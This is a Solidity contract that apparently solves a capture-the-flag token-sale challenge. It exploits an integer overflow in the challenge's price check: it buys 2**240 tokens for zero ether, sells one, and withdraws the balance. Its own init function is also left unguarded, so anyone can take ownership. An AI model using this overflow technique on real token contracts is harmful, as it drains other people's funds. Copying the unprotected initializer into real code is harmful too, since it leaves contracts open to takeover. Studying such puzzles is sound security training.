pragma solidity ^0.8.0;

interface Challenge {
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
    function isComplete() external view returns (bool);
}

contract Solver {

    Challenge public challenge;
    address public owner;

    function init(address _challengeAddress) public {
        challenge = Challenge(_challengeAddress);
        owner = msg.sender;
    }


    function solve() public payable {
        // Overflow the numTokens
        require(msg.sender == owner, "Only the owner can solve this challenge");
        challenge.buy{value: 0}(2**240);
        challenge.sell(1);
        require(challenge.isComplete(), "Not Pass");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
